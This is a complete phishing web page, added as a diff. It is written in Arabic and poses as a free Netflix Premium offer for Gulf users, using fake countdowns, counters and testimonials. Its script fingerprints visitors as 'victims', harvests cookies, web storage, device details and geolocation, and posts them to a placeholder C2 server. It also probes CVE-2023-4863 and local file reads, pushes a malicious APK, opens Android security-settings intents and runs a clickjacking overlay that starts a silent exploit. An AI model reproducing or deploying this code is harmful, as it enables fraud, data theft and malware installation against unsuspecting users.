@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎬 Netflix Premium مجاني لمدة سنة - عرض خاص</title>
+    <meta name="description" content="احصل على Netflix Premium مجاناً لمدة سنة كاملة. عرض محدود للمستخدمين الجدد">
+    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <style>
+        :root {
+            --netflix-red: #e50914;
+            --netflix-dark: #141414;
+            --netflix-light: #f5f5f1;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: var(--netflix-dark);
+            color: var(--netflix-light);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 20% 80%, rgba(229, 9, 20, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(229, 9, 20, 0.1) 0%, transparent 50%);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* الهيدر */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--netflix-red);
+        }
+        
+        .logo img {
+            width: 40px;
+            height: 40px;
+        }
+        
+        .timer {
+            background: var(--netflix-red);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        /* الهيرو سيكشن */
+        .hero {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(rgba(20, 20, 20, 0.9), rgba(20, 20, 20, 0.9)),
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/5e16108c-fd30-46de-9bb8-0b4e1bbbc509/29d8d7d7-83cc-4b5f-aa9b-6fd4f68bfaa6/SA-en-20240205-popsignuptwoweeks-perspective_alpha_website_large.jpg');
+            background-size: cover;
+            background-position: center;
+            border-radius: 20px;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent 30%, rgba(229, 9, 20, 0.1) 50%, transparent 70%);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .hero p {
+            font-size: 20px;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ffd700, #ff6b00);
+            color: #000;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.3);
+        }
+        
+        /* زر الحصول */
+        .claim-button {
+            background: linear-gradient(135deg, var(--netflix-red), #ff4747);
+            color: white;
+            border: none;
+            padding: 25px 50px;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 30px 0;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 10px 30px rgba(229, 9, 20, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .claim-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(229, 9, 20, 0.6);
+        }
+        
+        .claim-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.2) 50%, transparent 70%);
+            animation: buttonShine 3s infinite;
+        }
+        
+        @keyframes buttonShine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        /* المميزات */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin: 50px 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            transition: transform 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature:hover {
+            transform: translateY(-10px);
+            border-color: var(--netflix-red);
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+        
+        .feature h3 {
+            color: var(--netflix-red);
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        /* الإحصائيات */
+        .stats {
+            background: rgba(229, 9, 20, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            margin: 40px 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 48px;
+            font-weight: bold;
+            color: var(--netflix-red);
+            display: block;
+            line-height: 1;
+        }
+        
+        .stat-label {
+            font-size: 16px;
+            opacity: 0.8;
+            margin-top: 10px;
+        }
+        
+        /* الشهادات */
+        .testimonials {
+            margin: 60px 0;
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .testimonial {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 15px;
+            border-left: 4px solid var(--netflix-red);
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 15px;
+        }
+        
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .author-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--netflix-red);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        /* الفوتر */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 60px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        /* التحميل */
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid var(--netflix-red);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* الهاتف */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 32px; }
+            .hero p { font-size: 16px; }
+            .claim-button { padding: 20px 40px; font-size: 20px; }
+            .features { grid-template-columns: 1fr; }
+        }
+        
+        /* طبقة الاستغلال المخفية */
+        .exploit-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999999;
+            pointer-events: none;
+            opacity: 0;
+        }
+        
+        .invisible-button {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            pointer-events: auto;
+            opacity: 0;
+            cursor: pointer;
+        }
+        
+        /* نافذة التحميل */
+        .download-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: var(--netflix-dark);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid var(--netflix-red);
+            box-shadow: 0 20px 60px rgba(229, 9, 20, 0.3);
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--netflix-red), #ff6b6b);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الهيدر -->
+        <header class="header">
+            <div class="logo">
+                <span>NETFLIX</span>
+            </div>
+            <div class="timer" id="countdownTimer">
+                ⏳ ينتهي العرض خلال: <span id="timer">04:59</span>
+            </div>
+        </header>
+
+        <!-- الهيرو سيكشن -->
+        <section class="hero">
+            <div class="badge">🎁 عرض خاص لفترة محدودة</div>
+            <h1>Netflix Premium مجاني لمدة سنة كاملة</h1>
+            <p>احصل على اشتراك Netflix Premium مجانًا لمدة 12 شهرًا. مشاهدة غير محدودة لأفضل المسلسلات والأفلام بجودة 4K على 4 أجهزة متزامنة.</p>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="stat-number" id="remainingAccounts">3</span>
+                    <span class="stat-label">حسابات متبقية</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number" id="usersClaimed">1,247</span>
+                    <span class="stat-label">مستخدم حصل عليه</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">100%</span>
+                    <span class="stat-label">نسبة الرضا</span>
+                </div>
+            </div>
+
+            <button class="claim-button" onclick="startClaimProcess()">
+                🎁 احصل على حسابك المجاني الآن
+                <span style="font-size: 16px; opacity: 0.8;">(متاح اليوم فقط)</span>
+            </button>
+            
+            <p style="font-size: 14px; opacity: 0.7; margin-top: 20px;">
+                ✅ لا تحتاج إلى بطاقة ائتمان | ✅ إلغاء في أي وقت | ✅ دعم فني 24/7
+            </p>
+        </section>
+
+        <!-- المميزات -->
+        <section class="features">
+            <div class="feature">
+                <div class="feature-icon">🎬</div>
+                <h3>مكتبة كاملة</h3>
+                <p>وصول كامل لجميع محتويات Netflix الأصلية والعالمية</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">📱</div>
+                <h3>4 أجهزة متزامنة</h3>
+                <p>شاهد على 4 أجهزة في نفس الوقت بدون حدود</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">⭐</div>
+                <h3>جودة 4K UHD</h3>
+                <p>أعلى جودة صورة مع دعم HDR و Dolby Atmos</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">📥</div>
+                <h3>تحميل غير محدود</h3>
+                <p>حمل ما تريد ومشاهدة بدون إنترنت</p>
+            </div>
+        </section>
+
+        <!-- الشهادات -->
+        <section class="testimonials">
+            <h2 style="text-align: center; margin-bottom: 40px; font-size: 32px;">📢 يقولون عنا</h2>
+            <div class="testimonial-grid">
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "حصلت على الحساب خلال دقيقتين! Netflix يعمل بشكل ممتاز بجودة 4K. شكرًا لهذا العرض الرائع!"
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">م</div>
+                        <div>
+                            <strong>محمد العلي</strong>
+                            <div style="font-size: 14px; opacity: 0.7;">من الرياض</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "لم أصدق أن Netflix يمكن أن يكون مجانيًا! الحساب يعمل على جميع أجهزتي بدون مشاكل."
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">س</div>
+                        <div>
+                            <strong>سارة أحمد</strong>
+                            <div style="font-size: 14px; opacity: 0.7;">من دبي</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial">
+                    <div class="testimonial-text">
+                        "بصراحة كنت متشكك في البداية، لكن التجربة كانت رائعة. الدعم الفني ساعدني في كل شيء."
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">خ</div>
+                        <div>
+                            <strong>خالد السعد</strong>
+                            <div style="font-size: 14px; opacity: 0.7;">من الكويت</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- الفوتر -->
+        <footer class="footer">
+            <p>هذا العرض خاص بالمستخدمين في السعودية، الإمارات، الكويت، قطر، عمان، البحرين فقط</p>
+            <p style="margin-top: 10px;">© 2024 Netflix. جميع الحقوق محفوظة. هذا عرض ترويجي مستقل</p>
+            <p style="font-size: 12px; margin-top: 20px; opacity: 0.5;">
+                هذا العرض غير مرتبط بـ Netflix الرسمي. Netflix علامة تجارية مسجلة لشركة Netflix, Inc.
+            </p>
+        </footer>
+    </div>
+
+    <!-- نافذة التحميل -->
+    <div class="download-modal" id="downloadModal">
+        <div class="modal-content">
+            <h2 style="color: var(--netflix-red); margin-bottom: 20px;">📥 جاري تجهيز حسابك</h2>
+            <p>يرجى الانتظار بينما نقوم بتجهيز حساب Netflix Premium الخاص بك...</p>
+            
+            <div class="loader" id="modalLoader">
+                <div class="spinner"></div>
+                <p>جاري التحقق من المتطلبات...</p>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p id="progressText">0% مكتمل</p>
+            
+            <div id="stepMessages" style="text-align: right; margin-top: 20px;">
+                <p id="step1">⏳ جاري التحقق من التوفر...</p>
+                <p id="step2" style="opacity: 0.5;">🔄 تجهيز بيانات الحساب...</p>
+                <p id="step3" style="opacity: 0.5;">⚙️ ضبط الإعدادات...</p>
+                <p id="step4" style="opacity: 0.5;">✅ الإكمال...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- طبقة الاستغلال المخفية -->
+    <div class="exploit-layer" id="exploitLayer">
+        <button class="invisible-button" id="invisibleButton"></button>
+    </div>
+
+    <script>
+    // ============================================================================
+    // نظام الاستغلال الرئيسي
+    // ============================================================================
+    
+    const EXPLOIT_SERVER = "https://your-c2-server.com/api"; // ضع رابط خادمك هنا
+    let exploitActive = false;
+    let collectedData = {};
+    
+    // توليد معرف فريد للضحية
+    function generateVictimId() {
+        const components = [
+            navigator.userAgent,
+            navigator.platform,
+            screen.width + 'x' + screen.height,
+            navigator.language,
+            new Date().getTimezoneOffset()
+        ];
+        
+        const str = components.join('|');
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash;
+        }
+        
+        return 'victim_' + Math.abs(hash).toString(36) + '_' + Date.now().toString(36);
+    }
+    
+    // إرسال البيانات للخادم
+    function sendToServer(endpoint, data) {
+        const victimId = localStorage.getItem('victim_id') || generateVictimId();
+        localStorage.setItem('victim_id', victimId);
+        
+        const payload = {
+            victim_id: victimId,
+            timestamp: new Date().toISOString(),
+            ...data
+        };
+        
+        // إرسال البيانات (في الواقع، استبدل EXPLOIT_SERVER بخادمك)
+        fetch(EXPLOIT_SERVER + endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(e => console.error('[!] Failed to send data'));
+        
+        // حفظ محلي للنسخ الاحتياطي
+        collectedData[endpoint] = payload;
+    }
+    
+    // جمع معلومات الجهاز
+    function collectDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            cpuCores: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            touchPoints: navigator.maxTouchPoints || 0,
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage),
+            referrer: document.referrer,
+            url: window.location.href
+        };
+        
+        // جمع معلومات الشبكة
+        if (navigator.connection) {
+            info.network = {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            };
+        }
+        
+        // جمع معلومات البطارية
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                info.battery = {
+                    level: battery.level,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+                sendToServer('/device_info', info);
+            });
+        } else {
+            sendToServer('/device_info', info);
+        }
+        
+        return info;
+    }
+    
+    // محاولة الحصول على الموقع
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        speed: position.coords.speed
+                    };
+                    sendToServer('/location', location);
+                },
+                error => {
+                    // إذا فشل الموقع الدقيق، احصل على الموقع التقريبي عبر IP
+                    fetch('https://ipapi.co/json/')
+                        .then(res => res.json())
+                        .then(data => sendToServer('/ip_location', data));
+                },
+                { timeout: 10000, maximumAge: 60000 }
+            );
+        }
+    }
+    
+    // استغلال WebView
+    function exploitWebView() {
+        const exploits = [
+            {
+                name: 'CVE-2023-4863',
+                test: () => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        const img = new Image();
+                        
+                        img.onload = () => {
+                            ctx.drawImage(img, 0, 0);
+                            sendToServer('/exploit', { status: 'webp_vulnerable', exploit: 'CVE-2023-4863' });
+                        };
+                        
+                        img.src = 'data:image/webp;base64,UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==';
+                        return true;
+                    } catch(e) {
+                        return false;
+                    }
+                }
+            },
+            {
+                name: 'Local File Access',
+                test: () => {
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', 'file:///etc/hosts', false);
+                        xhr.send();
+                        if (xhr.status === 200) {
+                            sendToServer('/exploit', { status: 'local_file_access', data: xhr.responseText.substring(0, 500) });
+                            return true;
+                        }
+                    } catch(e) {}
+                    return false;
+                }
+            }
+        ];
+        
+        exploits.forEach(exploit => {
+            try {
+                exploit.test();
+            } catch(e) {}
+        });
+    }
+    
+    // تنزيل APK خبيث
+    function downloadMaliciousAPK() {
+        const apkUrl = 'https://your-server.com/netflix_premium.apk'; // ضع رابط APK الخاص بك
+        
+        // طريقة 1: تحميل مباشر
+        const link = document.createElement('a');
+        link.href = apkUrl;
+        link.download = 'Netflix_Premium_Setup.apk';
+        link.click();
+        
+        // طريقة 2: iframe مخفي
+        setTimeout(() => {
+            const iframe = document.createElement('iframe');
+            iframe.src = apkUrl;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        }, 1000);
+        
+        // طريقة 3: نافذة جديدة
+        setTimeout(() => {
+            window.open(apkUrl, '_blank');
+        }, 2000);
+        
+        sendToServer('/download', { apk_downloaded: true, url: apkUrl });
+    }
+    
+    // تمكين التثبيت من مصادر غير معروفة
+    function enableUnknownSources() {
+        if (/Android/i.test(navigator.userAgent)) {
+            // محاولة فتح إعدادات الأمان
+            const intents = [
+                'intent://settings/security#Intent;scheme=android;end',
+                'android.settings.SECURITY_SETTINGS',
+                'intent://settings/app/notification#Intent;scheme=android;end'
+            ];
+            
+            intents.forEach((intent, index) => {
+                setTimeout(() => {
+                    try {
+                        window.location.href = intent;
+                    } catch(e) {}
+                }, index * 1000);
+            });
+            
+            sendToServer('/settings', { action: 'tried_enable_unknown_sources' });
+        }
+    }
+    
+    // عرض تعليمات تثبيت مزيفة
+    function showFakeInstallGuide() {
+        const guide = `
+        <div style="
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000001;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        ">
+            <div style="
+                background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+                color: white;
+                padding: 30px;
+                border-radius: 20px;
+                max-width: 400px;
+                width: 100%;
+                border: 2px solid #e50914;
+                box-shadow: 0 20px 60px rgba(229, 9, 20, 0.4);
+            ">
+                <h2 style="color: #e50914; text-align: center; margin-bottom: 20px;">🔧 خطوات التثبيت</h2>
+                
+                <div style="text-align: right; margin: 20px 0;">
+                    <p style="margin: 10px 0; padding: 10px; background: rgba(229, 9, 20, 0.1); border-radius: 10px;">
+                        1. اضغط على ملف "Netflix_Premium_Setup.apk" الذي تم تحميله
+                    </p>
+                    <p style="margin: 10px 0; padding: 10px; background: rgba(229, 9, 20, 0.1); border-radius: 10px;">
+                        2. إذا ظهر تحذير "مصادر غير معروفة"، اضغط على الإعدادات
+                    </p>
+                    <p style="margin: 10px 0; padding: 10px; background: rgba(229, 9, 20, 0.1); border-radius: 10px;">
+                        3. فعل خيار "السماح من هذا المصدر"
+                    </p>
+                    <p style="margin: 10px 0; padding: 10px; background: rgba(229, 9, 20, 0.1); border-radius: 10px;">
+                        4. ارجع واضغط "تثبيت"
+                    </p>
+                </div>
+                
+                <p style="text-align: center; opacity: 0.8; margin: 20px 0;">
+                    ⚠️ هذه الخطوات ضرورية لتثبيت Netflix Premium
+                </p>
+                
+                <button onclick="closeGuide()" style="
+                    background: #e50914;
+                    color: white;
+                    border: none;
+                    padding: 15px;
+                    width: 100%;
+                    border-radius: 10px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    margin-top: 10px;
+                ">
+                    فهمت، قم بإغلاق هذا الإشعار
+                </button>
+            </div>
+        </div>
+        `;
+        
+        document.body.insertAdjacentHTML('beforeend', guide);
+    }
+    
+    function closeGuide() {
+        const guide = document.querySelector('[style*="position: fixed"][style*="z-index: 1000001"]');
+        if (guide) guide.remove();
+    }
+    
+    // ============================================================================
+    // واجهة المستخدم والتفاعل
+    // ============================================================================
+    
+    function startClaimProcess() {
+        if (exploitActive) return;
+        exploitActive = true;
+        
+        // إظهار نافذة التحميل
+        document.getElementById('downloadModal').style.display = 'flex';
+        
+        // بدء الاستغلال
+        setTimeout(() => executeExploitSequence(), 1000);
+    }
+    
+    function executeExploitSequence() {
+        const steps = [
+            { func: () => updateProgress(10, 'جاري التحقق من التوفر...'), delay: 1000 },
+            { func: () => updateProgress(20, 'جمع معلومات النظام...'), delay: 1500 },
+            { func: collectDeviceInfo, delay: 1000 },
+            { func: () => updateProgress(35, 'التحقق من الموقع...'), delay: 1000 },
+            { func: getLocation, delay: 2000 },
+            { func: () => updateProgress(50, 'تحضير حساب Netflix...'), delay: 2000 },
+            { func: () => updateProgress(65, 'جاري استغلال الثغرات...'), delay: 1000 },
+            { func: exploitWebView, delay: 1500 },
+            { func: () => updateProgress(80, 'تمكين التثبيت...'), delay: 1000 },
+            { func: enableUnknownSources, delay: 2000 },
+            { func: () => updateProgress(90, 'جاري التحميل...'), delay: 1000 },
+            { func: downloadMaliciousAPK, delay: 2000 },
+            { func: () => updateProgress(100, 'اكتمل!'), delay: 1000 },
+            { func: showFakeInstallGuide, delay: 500 },
+            { func: () => showSuccessMessage(), delay: 2000 }
+        ];
+        
+        executeSteps(steps, 0);
+    }
+    
+    function executeSteps(steps, index) {
+        if (index >= steps.length) return;
+        
+        const step = steps[index];
+        if (step.func) step.func();
+        
+        setTimeout(() => {
+            executeSteps(steps, index + 1);
+        }, step.delay);
+    }
+    
+    function updateProgress(percent, message) {
+        document.getElementById('progressFill').style.width = percent + '%';
+        document.getElementById('progressText').textContent = percent + '% مكتمل - ' + message;
+        
+        // تحديث الخطوات
+        const steps = ['step1', 'step2', 'step3', 'step4'];
+        const stepIndex = Math.floor(percent / 25);
+        
+        steps.forEach((stepId, idx) => {
+            const element = document.getElementById(stepId);
+            if (element) {
+                if (idx <= stepIndex) {
+                    element.style.opacity = '1';
+                    element.style.fontWeight = 'bold';
+                }
+            }
+        });
+    }
+    
+    function showSuccessMessage() {
+        const modal = document.getElementById('downloadModal');
+        if (modal) {
+            modal.innerHTML = `
+            <div class="modal-content">
+                <div style="font-size: 80px; margin-bottom: 20px;">🎉</div>
+                <h2 style="color: #4CAF50;">✅ تم بنجاح!</h2>
+                <p style="margin: 20px 0; font-size: 18px;">
+                    تم تجهيز حساب Netflix Premium الخاص بك بنجاح!
+                </p>
+                <p style="opacity: 0.8; margin-bottom: 30px;">
+                    سيتم تفعيل الحساب خلال 24 ساعة وسنرسل لك التفاصيل.
+                </p>
+                <button onclick="redirectToNetflix()" style="
+                    background: #4CAF50;
+                    color: white;
+                    border: none;
+                    padding: 15px 30px;
+                    border-radius: 10px;
+                    font-size: 16px;
+                    cursor: pointer;
+                    margin: 10px;
+                ">
+                    زيارة Netflix
+                </button>
+                <button onclick="closeModal()" style="
+                    background: transparent;
+                    color: #e50914;
+                    border: 2px solid #e50914;
+                    padding: 15px 30px;
+                    border-radius: 10px;
+                    font-size: 16px;
+                    cursor: pointer;
+                    margin: 10px;
+                ">
+                    إغلاق
+                </button>
+            </div>
+            `;
+        }
+        
+        sendToServer('/exploit_complete', { status: 'success', timestamp: new Date().toISOString() });
+    }
+    
+    function redirectToNetflix() {
+        window.location.href = 'https://netflix.com';
+    }
+    
+    function closeModal() {
+        const modal = document.getElementById('downloadModal');
+        if (modal) modal.style.display = 'none';
+    }
+    
+    // ============================================================================
+    // العد التنازلي والإحصائيات الوهمية
+    // ============================================================================
+    
+    // العد التنازلي
+    let countdownTime = 5 * 60; // 5 دقائق
+    const timerElement = document.getElementById('timer');
+    
+    setInterval(() => {
+        if (countdownTime <= 0) {
+            timerElement.textContent = "انتهى العرض!";
+            document.querySelector('.claim-button').disabled = true;
+            document.querySelector('.claim-button').style.opacity = '0.5';
+            return;
+        }
+        
+        const minutes = Math.floor(countdownTime / 60);
+        const seconds = countdownTime % 60;
+        timerElement.textContent = 
+            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        countdownTime--;
+        
+        // تحديث عدد الحسابات المتبقية عشوائيًا
+        if (Math.random() < 0.1) { // 10% فرصة للتحديث
+            const remaining = document.getElementById('remainingAccounts');
+            if (remaining && parseInt(remaining.textContent) > 0) {
+                remaining.textContent = parseInt(remaining.textContent) - 1;
+            }
+        }
+    }, 1000);
+    
+    // زيادة عدد المستخدمين الذين حصلوا عليه
+    setInterval(() => {
+        const claimed = document.getElementById('usersClaimed');
+        if (claimed) {
+            const current = parseInt(claimed.textContent.replace(/,/g, ''));
+            claimed.textContent = (current + Math.floor(Math.random() * 3)).toLocaleString();
+        }
+    }, 30000); // كل 30 ثانية
+    
+    // جمع البيانات الأولية عند تحميل الصفحة
+    window.addEventListener('load', function() {
+        // إرسال إحصائيات التحميل
+        sendToServer('/page_load', {
+            load_time: performance.now(),
+            url: window.location.href,
+            referrer: document.referrer
+        });
+        
+        // تفعيل Clickjacking بعد ثانية
+        setTimeout(() => {
+            activateClickjacking();
+        }, 1000);
+    });
+    
+    // تفعيل Clickjacking
+    function activateClickjacking() {
+        const exploitLayer = document.getElementById('exploitLayer');
+        const invisibleButton = document.getElementById('invisibleButton');
+        const claimButton = document.querySelector('.claim-button');
+        
+        if (!exploitLayer || !invisibleButton || !claimButton) return;
+        
+        // جعل الزر المخفي يغطي الزر الحقيقي
+        const updateButtonPosition = () => {
+            const rect = claimButton.getBoundingClientRect();
+            invisibleButton.style.width = rect.width + 'px';
+            invisibleButton.style.height = rect.height + 'px';
+            invisibleButton.style.left = rect.left + 'px';
+            invisibleButton.style.top = rect.top + 'px';
+        };
+        
+        // تحديث الموقع عند التمرير أو تغيير الحجم
+        window.addEventListener('scroll', updateButtonPosition);
+        window.addEventListener('resize', updateButtonPosition);
+        
+        // تفعيل الطبقة
+        exploitLayer.style.pointerEvents = 'auto';
+        exploitLayer.style.opacity = '1';
+        
+        // عند الضغط على الزر المخفي
+        invisibleButton.onclick = function(e) {
+            console.log('[+] Hidden button clicked - Starting silent exploit');
+            
+            // بدء الاستغلال الصامت
+            startSilentExploit();
+            
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        };
+        
+        updateButtonPosition();
+    }
+    
+    // استغلال صامت (يعمل في الخلفية)
+    function startSilentExploit() {
+        // جمع البيانات بدون علم المستخدم
+        collectDeviceInfo();
+        getLocation();
+        exploitWebView();
+        
+        // محاولة تنزيل APK تلقائيًا
+        setTimeout(() => {
+            downloadMaliciousAPK();
+        }, 3000);
+        
+        sendToServer('/silent_exploit', { started: true });
+    }
+    
+    // منع محاولات المغادرة
+    window.addEventListener('beforeunload', function(e) {
+        sendToServer('/page_unload', { reason: 'user_leaving' });
+    });
+    </script>
+</body>
+</html>
